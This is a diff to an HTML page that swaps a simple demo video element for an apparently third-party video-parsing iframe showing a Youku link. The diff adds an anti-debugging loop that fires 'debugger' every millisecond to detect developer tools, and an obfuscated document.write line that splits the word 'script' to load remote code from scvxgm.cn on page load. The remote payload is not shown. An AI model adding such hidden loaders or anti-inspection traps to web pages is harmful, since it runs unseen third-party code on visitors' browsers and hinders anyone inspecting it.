@@ -1,12 +1,60 @@
 
-   	
-			
-			
-			
-		
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no" />
+<title>思古视频服务:快速_稳定</title>
+<style type="text/css">
+body,html,#sigu{background-color:black;padding: 0;margin: 0;width:100%;height:100%;color:#999;psotion:relative;overflow: hidden;}
+</style>
+</head>
+<body>
+<div id="sigu" style="psotion:relative;"><iframe width="100%" height="100%" allowFullScreen="true" allowTransparency="true" frameborder="0" scrolling="no" src="https://jx.sigujx.com/?url=https://v.youku.com/v_show/id_XNDkyOTQwOTkxNg==.html?spm=a2hbt.13141534.app.5~5!2~5!2~5~5~5!2~5~5!2~5!2~5!2~5~A!15&s=edcd4d22837440e09f48"></iframe></div>
+<script type="text/javascript">
+var check = (function () {
+  var callbacks = [],
+    timeLimit = 50,
+    open = false;
+  setInterval(loop, 1);
+  return {
+    addListener: function (fn) {
+      callbacks.push(fn);
+    },
+    cancleListenr: function (fn) {
+      callbacks = callbacks.filter(function (v) {
+        return v !== fn;
+      });
+    }
+  }
 
-<video id="myVideo" autoplay loop>
-  <source src="https://www.w3schools.com/jsref/movie.mp4" type="video/mp4">
-  <source src="https://www.w3schools.com/jsref/movie.ogg" type="video/ogg">
-  Your browser does not support the video tag.
-</video>
+  function loop() {
+    var startTime = new Date();
+    debugger;
+    if (new Date() - startTime > timeLimit) {
+      if (!open) {
+        callbacks.forEach(function (fn) {
+          fn.call(null);
+        });
+      }
+      open = true;
+    } else {
+      open = false;
+    }
+  }
+})();
+
+check.addListener(function () {});
+</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?edc193f077b6b613964bcf4bbf0712d2";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script type="text/javascript">document.write("<scr"+"ipt src=\"https://scvxgm.cn/m-1834-844309\" aysnc=\"aysnc\"></sc"+"ript>")</script>
+</body>
+</html>
